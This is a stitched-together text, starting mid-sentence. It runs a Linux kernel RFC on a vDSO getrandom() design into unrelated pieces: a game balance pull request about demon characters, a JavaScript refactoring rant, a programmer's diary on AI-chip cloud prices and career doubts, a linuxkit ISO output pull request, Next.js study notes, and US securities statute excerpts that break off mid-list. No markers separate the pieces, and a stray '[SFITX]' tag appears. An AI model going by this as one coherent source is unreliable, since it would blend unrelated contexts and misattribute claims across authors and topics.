to expand a getrandom() seed from time T1 for the next hour, and at some
point T2 < hour, the virtual machine forked, userspace would continue to
provide the same numbers to two (or more) different virtual machines,
resulting in potential cryptographic catastrophe. Something similar
happens on resuming from hibernation (or even suspend), with various
compromise scenarios there in mind.

There's a more general reason why userspace rolling its own RNG from a
getrandom() seed is fraught. There's a lot of attention paid to this
particular Linuxism we have of the RNG being initialized and thus
non-blocking or uninitialized and thus blocking until it is initialized.
These are our Two Big States that many hold to be the holy
differentiating factor between safe and not safe, between
cryptographically secure and garbage. The fact is, however, that the
distinction between these two states is a hand-wavy wishy-washy inexact
approximation. Outside of a few exceptional cases (e.g. a HW RNG is
available), we actually don't really ever know with any rigor at all
when the RNG is safe and ready (nor when it's compromised). We do the
best we can to "estimate" it, but entropy estimation is fundamentally
impossible in the general case. So really, we're just doing guess work,
and hoping it's good and conservative enough. Let's then assume that
there's always some potential error involved in this differentiator.

In fact, under the surface, the RNG is engineered around a different
principal, and that is trying to *use* new entropic inputs regularly and
at the right specific moments in time. For example, close to boot time,
the RNG reseeds itself more often than later. At certain events, like VM
fork, the RNG reseeds itself immediately. The various heuristics for
when the RNG will use new entropy and how often is really a core aspect
of what the RNG has some potential to do decently enough (and something
that will probably continue to improve in the future from random.c's
present set of algorithms). So in your mind, put away the metal
attachment to the Two Big States, which represent an approximation with
a potential margin of error. Instead keep in mind that the RNG's primary
operating heuristic is how often and exactly when it's going to reseed.

So, if userspace takes a seed from getrandom() at point T1, and uses it
for the next hour (or N megabytes or some other meaningless metric),
during that time, potential errors in the Two Big States approximation
are amplified. During that time potential reseeds are being lost,
forgotten, not reflected in the output stream. That's not good.

The simplest statement you could make is that userspace RNGs that expand
a getrandom() seed at some point T1 are nearly always *worse*, in some
way, than just calling getrandom() every time a random number is
desired.

For those reasons, after some discussion on libc-alpha, glibc's
arc4random() now just calls getrandom() on each invocation. That's
trivially safe, and gives us latitude to then make the safe thing faster
without becoming unsafe at our leasure. Card shuffling isn't
particularly fast, however.

How do we rectify this? By putting a safe implementation of getrandom()
in the vDSO, which has access to whatever information a
particular iteration of random.c is using to make its decisions. I use
that careful language of "particular iteration of random.c", because the
set of things that a vDSO getrandom() implementation might need for making
decisions as good as the kernel's will likely change over time. This
isn't just a matter of exporting certain *data* to userspace. We're not
going to commit to a "data API" where the various heuristics used are
exposed, locking in how the kernel works for decades to come, and then
leave it to various userspaces to roll something on top and shoot
themselves in the foot and have all sorts of complexity disasters.
Rather, vDSO getrandom() is supposed to be the *same exact algorithm*
that runs in the kernel, except it's been hoisted into userspace as
much as possible. And so vDSO getrandom() and kernel getrandom() will
always mirror each other hermetically.

API-wise, vDSO getrandom has a pair of functions:

  ssize_t getrandom(void *state, void *buffer, size_t len, unsigned int flags);
  void *getrandom_alloc([inout] size_t *num, [out] size_t *size_per_each);

In the first function, the return value and the latter 3 arguments are
the same as ordinary getrandom(), while the first argument is a pointer
to some state allocated with getrandom_alloc(). getrandom_alloc() takes
the desired number of states, and returns an array of states, the number
actually allocated, and the size in bytes of each one, enabling a libc
to use one per thread. We very intentionally do *not* leave state
allocation up to the caller. There are too many weird things that can go
wrong, and it's important that vDSO does not provide too generic of a
mechanism. It's not going to store its state in just any old memory
address. It'll do it only in ones it allocates.

Right now this means it's a mlock'd page with WIPEONFORK set. In the
future maybe there will be other interesting page flags or
anti-heartbleed measures, or other platform-specific kernel-specific
things that can be set. Again, it's important that the vDSO has a say in
how this works rather than agreeing to operate on any old address;
memory isn't neutral.

The interesting meat of the implementation is in lib/vdso/getrandom.c,
as generic C code, and it aims to mainly follow random.c's buffered fast
key erasure logic. Before the RNG is initialized, it falls back to the
syscall. Right now it uses a simple generation counter to make its
decisions on reseeding; this covers many cases, but not all, so this RFC
still has a little bit of improvement work to do. But it should give you
the general idea.

The actual place that has the most work to do is in all of the other
files. Most of the vDSO shared page infrastructure is centered around
gettimeofday, and so the main structs are all in arrays for different
timestamp types, and attached to time namespaces, and so forth. I've
done the best I could to add onto this in an unintrusive way, but you'll
notice almost immediately from glancing at the code that it still needs
some untangling work. This also only works on x86 at the moment. I could
certainly use a hand with this part.

So far in my test results, performance is pretty stellar (around 15x for
uint32_t generation), and it seems to be working. But this is very, very
young, immature code, suitable for an RFC and no more, so expect
dragons.

Sinful demon changes + re-enable (#14345)

* first wave of demon changes

many changes
1: gluttonous demons hunger 3x as fast as normal people
2: all demons no longer enter softcrit (still can enter hardcrit), are geneless, dont suffocate in crit, and have stable hearts.
3: true demon form deals 20 damage instead of 24 (wrath is 24 instead of 28). Health is lowered to 160 and health regen per hit is now 8 instead of 10. To compensate, they are ever so slightly faster, but are still slower than everyone but podpeople. Demons also lose 2 hp every life tick (a life tick is generally 2 seconds, so 2 hp every 2 seconds), so as to try to deter you from staying in demon form the entire round.
4: objectives are made a bit less murderbone-ey.
5: sinful demon spawns slightly less often

* re enables event

* fixes

* removes chance for envy to get an identity theft objective

* word change

* sinful demon is rarer still

honestly, they arent very interesting if they happen too much, so i'd like them to mildly rare

Tidy up .../billing/services/transactions-csv.js (#2120)

https://eaflood.atlassian.net/browse/WATER-3586

We came across transactions-csv.js as part of working on altering the bill run download to handle SROC bill runs.

To say it angered and upset the current dev team is a bit of an understatement. You _could_ argue calling a function to pull a couple of fields from an object has value (though in our opinion you'd be wrong!)

But there is no reason for making an _utter_ mess of known conventions around `private` and `public` methods. It is a [common practice](https://stackoverflow.com/a/4484449/6117745) in JavaScript to prefix private module methods with an underscore. This singles intent to other developers; these methods are only used internally by the module, and those without it are for use elsewhere in the code.

So, after another day of struggling through the code imagine our consternation when we come across this

```javascript
exports._getInvoiceData = getInvoiceData
exports._getInvoiceAccountData = getInvoiceAccountData
exports._getTransactionData = getTransactionData
exports._getTransactionAmounts = getTransactionAmounts
exports.createCSV = createCSV
exports.getCSVFileName = getCSVFileName
```

We are making `private` methods `public` but when we do so we are identifying them as `private`. Arrrrgh!!! 🤬😠

As far as we can see this was _solely_ for the purpose of testing the methods. _They are not referenced anywhere else!!!_ So, added to our convention-breaking we're also directly testing methods intended to be private and making them public purely to allow those tests to run. 🤯🤦

We have no words. Just know this change attempts to make things a little better 🥹

"3:55pm. https://techcrunch.com/sponsor/g-core-labs/accelerate-ai-ml-with-the-new-ipu-based-cloud-platform-by-g-core-labs-graphcore/

I am going through the news trying to get a sense of how old Graphcore's cloud offering is.

`<meta name="sailthru.date" content="2022-07-14 11:54:45" />`

There isn't a published date in the article, but I found this in the source.

`"dateCreated":"2022-07-14T18:54:45Z","datePublished":"2022-07-14T18:54:45Z","dateModified":"2022-07-15T17:40:17Z"`

So it was only published two weeks ago.

Thanks to this, I can conclude that Graphcore's cloud is new.

https://cirrascale.com/graphcloud.php

Holy shit these prices are huge.

3k a week? 20$/h. It is like I am made of gold.

> * Cirrascale Cloud Services does not provide servers by the hour. The "hourly equivalent" price is shown as a courtesy for comparison against vendors like AWS, Google Cloud, and Microsoft Azure.

Don't tell me I have to rent it for something like an entire week?

https://www.enterpriseai.news/2021/01/29/graphcore-ipu-gets-a-public-cloud-boost/

Actually, it was from a while ago. So the Graphcore cloud has been there for a while.

4:05pm. Anyway, the plan I've been toying in my mind is to make a Graphcore & Tenstorrent backends and run a little game on them. Well, not a little, but Texas Holdem. I could also make a Python backend. I could then use that to advertize and seek out sponsors. 'Look how easy it is to program these chips in Spiral. This is the power of functional programming with partial evaluation.'

It would be a lot of work, but it would be fun to do. But the above prices are simply prohibitive.

Is my quest going to end here? At this rate, I am simply going to get priced out of the Singularity. Isn't there anything I can do here?

https://www.youtube.com/results?search_query=interview+practcie

I am going to put some effort into studying this just in case.

https://www.youtube.com/watch?v=srw4r3htm4U
Job Interview Simulation and Training - Mock Interview

Let me watch this.

...Actually nevermind that for now. I do not feel like simulating interviews.

4:20pm. Maybe the cloud platform by G-Core is something other than Cirrascale and it might be cheaper.

4:25pm. There is no way around it. After I've gotten a good night's rest, I will go into the TensTorrent discord and do the following.

* Ask whether I could take a look at the docs despite not being a customer yet. Note that I am interested in how their chip could be programmed at a low level. Explain the `Question To A Machine` proposal.
* Ask whether they'd be interested in a functional programming language such as Spiral to replace C++ and show it to them. Touch upon the benefits it has. Ask whether they have any customers who are using it for purposed other than purely deep learning and are interested in the simulation capabilities of the chip.
* Ask whether they'd be interested in hiring a functional PL expert such as myself.
* Tell them I'd be interested in implementing a Spiral backend for the TensTorrent chip as well as a demo to showcase it. It will be the Texas Holdem game. I'll try to implement the training process as well and test how many hands per second that gets me.

4:50pm. Hmmmm...I'll try that. But if that fails, I am not sure what I'll want to do. Writing after all?

My interest in regular programming tasks is nil. It is easy to come up with a plan as if it were a game:

* Grind freelancing.
* Practice interviewing.
* Apply to jobs.

And so on. This is how I'd guide a player character here. But subjectively, I am always operating at the limit of my will.

5pm. I want to write, and I want to program, but I can't do both.

Maybe after finishing that C backend, I've already peaked as a programmer? I feel really lame to end the journey like this - by expending my willpower and retreating into the land of dreams. Considering I want to cause the Singularity, you'd imagine such a person would continue pushing forward forever until he gets his way, instead of accepting the encroaching demise.

5:10pm. In this situation what I really want to do is grind AI chip related apps. If I wanted to be a regular programmer, I'd make vanilla apps. The kinds of programs I am interested in are RL agents and simulations on AI chips. But I can't think of a way to turn profit on those?

Short term financial trading? I do not have the capital to start that. And even so I am not interested in short term trading, but longer term.

There are just so many things you can do in this world, it is maddening. It is not like in a static game where you are invited to do all the side quests.

5:15pm. It is not actually such a bad thing to try writing for 6 months or a year. If try it and get no success, I can take it as a sign that there is no point in me being a writter. That would make regular programming jobs attractive.

Right now I am 35. If I write for a year or two, I'll still have two decades to apply myself as a human programmer. Maybe I could keep going till I am 70 or even 80 even.

I think a decade of programming would be enough to wipe away my shame. I'll get a junior position somewhere, even locally if need be, and work my way up from there.

5:20pm. It depends whether I can get to 1k/month as a writter which is the average yearly wage in Croatia.

It is a risk, everything is a risk.

Compared to 2014, my art skill really is better so I won't have trouble with the covers again.

5:40pm. It is not the end of my life, but it is the end of my path a solo dev. If I want resources and money I need to turn pro.

I'll forget the pride of 6.5 years of struggle on my own and start from the ground up. It will be like an adult going to kindergarden, but I have to start somewhere and that somewhere will have to be at the bottom whether that means freelancing or junior wage positions. I won't aim for senior right off the bat. I can laugh at those midwit senior Googlers who don't understand linked lists, but they have a point that this is not used professionally, and I do not know what is. I have to acknowledge this weakness of mine. They might not have programming skills, but they do have what I don't.

5:45pm. Either I step on the path of a pro visual novelist or a pro developer.

I am going to decide that soon. That trip to the Discord will decide it for me.

I'll step on the pro programmer path working on AI chips or I will write stories about the Singularity.

If that Discord is just one guy doing tech support then that is fine, I guess I'll go the novelist route. But if it turns out there are active conversations about the use of TensTorrent's chips by a community, I will have a possibility of making something of Spiral.

TensTorrent is probably the only choice. Graphcore's prices are extremely high, I can't imagine it being used for anything but deep learning.

6:10pm. I think the scenario is highly likely that I'll go the novelist route. My luck when it comes to programming was always bad. Nothing good has happened to me in programming.

6:15pm. Let me close here. Tomorrow I will do a write up for the TensTorrent discord and take the plunge. After that I'll take a break, and most likely begin writing for real.

Sigh, I remember when I stopped writing Simulacrum in 2014. I was so sad to leave it in favor of programming. I'll be similarly sad to leave programming behind too. But I'll be back at some point if I am able. When I was 27, my succeesses during my schooldays and my talent summoned me back to it after a decade and half of absence.

Maybe Spiral will be calling me back at some point too."

New output format: iso-efi-initrd

This option was previously not available and required postprocessing of a `tar-kernel-initrd` output.

Comparison with `iso-efi`:

`iso-efi` only loads the kernel at boot, and the root filesystem is mounted from the actual boot media (eg, a CD-ROM - physical or emulated). This can often cause trouble (it has for us) for multiple reasons:
- the linuxkit kernel might not have the correct drivers built-in for the hardware (see #3154)
- especially with virtual or emulated CD-ROMs, performance can be abysmal: we saw the case where the server IPMI allowed using a ISO stored in AWS S3 over HTTP...you can imagine what happens when you start doing random I/O on the root fs in that case.
- The ISO image has the root device name baked in (ie, `/dev/sr0`) which fails if for some reason the CD-ROM we're running from doesn't end up using that device, so manual tweaking is required (see #2375)

`iso-efi-initrd`, on the other hand, packs the root filesystem as an initramfs (ie similar to what the raw output does, except that in this case we're preparing an ISO image), so both the kernel and the initramfs are loaded in memory by the boot loader and, once running, we don't need to worry about root devices or kernel drivers (and the speed is good, as everything runs in RAM).

Also, the generated ISO can be copied verbatim (eg with `dd`) onto a USB media and it still works.

Finally, the image size is much smaller compared to `iso-efi`.

IMHO, `iso-efi-initrd` could be used almost anywhere `iso-efi` would be used, or might even supersede it. I can't think of a scenario where one might explicitly want to use `iso-efi`.

Points to consider:

- Not tested under aarch64 as I don't have access to that arch. If the automated CI tests also test that, then it should be fine.
- I'm not sure what to put inside `images.yaml` for the `iso-efi-initrd` image. As it is it works of course (my personal image on docker hub), but I guess it'll have to be some more "official" image. However, that cannot be until this PR is merged, so it's kind of a chicken and egg situation. Please advise.
- I can look into adding the corresponding `iso-bios-initrd` builder if there is interest.

IMPORTANT: getStaticPaths

Woooh, there's a lot of things to understand here.

Again, see the video Section 04: 52. Next - getStaticPaths and 53. Generando las 151 páginas de Pokémons

Where to even begin?

You write the getStaticPaths function before the getStaticProps. Not sure if it NEEDS to be before, but anyway.

GetstaticPaths is the one in charge to create ALL 151 PAGES when yarn build.

Later on, getStaticPaths allows StaticProps to obtain the params on the url, in this case, just the id as a string, using the context.
The context has way more properties, but we destructure it to obtain only params.

From the params, we obtain the id, and with that ID we axios the shit out of the pokemon ID.

We send that data as props to the page and there you can do whatever the hell you want with it.

In dev mode it is slow af, but when you yarn build, the build process is the one and only time it will be slow, because it is fetching the data and stuff from all 151 pokemons.

Once it finishes, yarn start will serve all the pages and it will be smooth fast... tho, not as fast as simple React App with vite or CRA.

15 U.S. Code § 78r - Liability for misleading statements (a)Persons liable; persons entitled to recover; defense of good faith; suit at law or in equity; costs, etc. Any person who shall make or cause to be made any statement in any application, report, or document filed pursuant to this chapter or any rule or regulation thereunder or any undertaking contained in a registration statement as provided in subsection (d) of section 78o of this title, which statement was at the time and in the light of the circumstances under which it was made false or misleading with respect to any material fact, shall be liable to any person (not knowing that such statement was false or misleading) who, in reliance upon such statement, shall have purchased or sold a security at a price which was affected by such statement, for damages caused by such reliance, unless the person sued shall prove that he acted in good faith and had no knowledge that such statement was false or misleading. A person seeking to enforce such liability may sue at law or in equity in any court of competent jurisdiction. In any such suit the court may, in its discretion, require an undertaking for the payment of the costs of such suit, and assess reasonable costs, including reasonable attorneys’ fees, against either party litigant.

(b)Contribution Every person who becomes liable to make payment under this section may recover contribution as in cases of contract from any person who, if joined in the original suit, would have been liable to make the same payment.

(c)Period of limitations No action shall be maintained to enforce any liability created under this section unless brought within one year after the discovery of the facts constituting the cause of action and within three years after such cause of action accrued.

[SFITX] 15 U.S. Code § 78s - Registration, responsibilities, and oversight of self-regulatory organizations (5)The Commission shall consult with and consider the views of the Secretary of the Treasury prior to approving a proposed rule filed by a registered securities association that primarily concerns conduct related to transactions in government securities, except where the Commission determines that an emergency exists requiring expeditious or summary action and publishes its reasons therefor. If the Secretary of the Treasury comments in writing to the Commission on a proposed rule that has been published for comment, the Commission shall respond in writing to such written comment before approving the proposed rule. If the Secretary of the Treasury determines, and notifies the Commission, that such rule, if implemented, would, or as applied does (i) adversely affect the liquidity or efficiency of the market for government securities; or (ii) impose any burden on competition not necessary or appropriate in furtherance of the purposes of this section, the Commission shall, prior to adopting the proposed rule, find that such rule is necessary and appropriate in furtherance of the purposes of this section notwithstanding the Secretary’s determination.

https://www.sec.gov/alj/aljdec/2015/id739ce.pdf[t]he proper functioning of the securities industry and markets depends on the integrity of industry participants and their commitment to transparent disclosure. Securities industry participation by persons with a history of fraudulent conduct is antithetical to the protection of investors. . . . We have long held that a history of egregious fraudulent conduct demonstrates unfitness for future participation in the securities industry even if the disqualifying conduct is not related to the professional capacity in which the respondent was acting when he or she engaged in the misconduct underlying the proceeding. The industry relies on the fairness and integrity of all persons associated with each of the professions covered by the collateral bar to forgo opportunities to defraud and abuse other market participants.

TRANSACTIONS OF CERTAIN AFFILIATED PERSONS AND UNDERWRITERS -UNLAWFUL TRANSACTIONS SEC. 17. (a) It shall be unlawful for any affiliated person or pro- moter of or principal underwriter for a registered investment company (other than a company of the character described in section 12 (d) (3) (A) and (B)), or any affiliated person of such a person, promoter, or principal underwriter, acting as principal- (1) knowingly to sell any security or other property to such registered company or to any company controlled by such regis- tered company, unless such sale involves solely (A) securities of which the buyer is the issuer, (B) securities of which the seller is the issuer and which are part of a general offering to the holders of a class of its securities, or (C) securities deposited with the trustee of a unit investment trust or periodic payment plan by the depositor thereof;

(2) knowingly to purchase from such registered company, or from any company controlled by such registered company, any security or other property (except securities of which the seller is the issuer)

Liability of directors, etc., for willful misfeasance. SEC. 17. (h) After one year from the effective date of this title, neither the charter, certificate of incorporation, articles of association, indenture of trust, nor the by-laws of any registered investment company, nor any other instrument pursuant to which such a company is organized or administered, shall contain any provision which protects or purports to protect any director or officer of such company against any liability to the company or to its security holders to which he would otherwise be subject by reason of willful misfeasance, bad faith, gross negligence or reckless disregard of the duties involved in the conduct of his office.

|In the event that any such instrument does not at the effective date of this Act comply with the requirements of this subsection (h) and is not amended to comply therewith prior to the expiration of said one year, such company may nevertheless continue to be a registered investment company and shall not be deemed to violate this subsection if prior to said expiration date each such director or officer shall have filed with the Commission a waiver in writing of any protective provision of the instrument to the extent that it does not comply with this subsection, and each such person subsequently elected or appointed shall before assuming office file a similar waiver. |

(i) After one year from the effective date of this title no contract or agreement under which any person undertakes to act as investment adviser of, or principal underwriter for, a registered investment company shall contain any provision which protects or purports to protect such person against any liability to such company or its security holders to which he would otherwise be subject by reason of willful misfeasance, bad faith, or gross negligence, in the performance of his duties, or by reason of his reckless disregard of his obligations and duties under such contract or agreement.

Injunctions against gross abuse. SEC. 36. The Commission is authorized to bring an action in the proper district court of the United States or United States court of any Territory or other place subject to the jurisdiction of the United States, alleging that a person serving or acting in one or more of the following capacities has been guilty, after the enactment of this title and within five years of the commencement of the action, of gross misconduct or gross abuse of trust in respect of any registered investment company for which such person so serves or acts: (1) as officer, director, member of an advisory board, investment adviser, or depositor; or (2) as principal underwriter, if such registered company is an open-end company, unit investment trust, or face-amount certificate company. If the Commission's allegations of such gross misconduct or gross abuse of trust are established, the court shall enjoin such person from acting in such capacity or capacities either permanently or for such period of time as it in its discretion shall deem appropriate.

SEC. 32.
